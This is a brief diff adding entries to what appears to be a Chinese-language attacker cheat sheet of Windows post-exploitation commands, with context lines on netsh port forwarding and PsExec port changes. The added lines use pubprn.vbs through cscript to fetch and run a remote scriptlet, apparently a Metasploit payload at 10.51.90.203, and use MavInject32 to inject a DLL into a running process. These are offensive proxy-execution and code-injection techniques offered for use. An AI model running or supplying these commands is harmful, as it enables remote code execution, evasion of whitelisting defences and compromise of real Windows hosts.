@@ -249,3 +249,10 @@ netsh interface portproxy add v4to listenaddress=ip1 listenport=port1 connectadd
 netsh interface portproxy dump
 netsh interface portproxy reset
 修改psexec 源码的端口改为port1
+
+
+
+
+
+c:\windows\SysWOW64\cscript.exe c:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://10.51.90.203/lm/msf2.sct
+MavInject32.exe pid /INJECTRUNNING <PATH DLL>
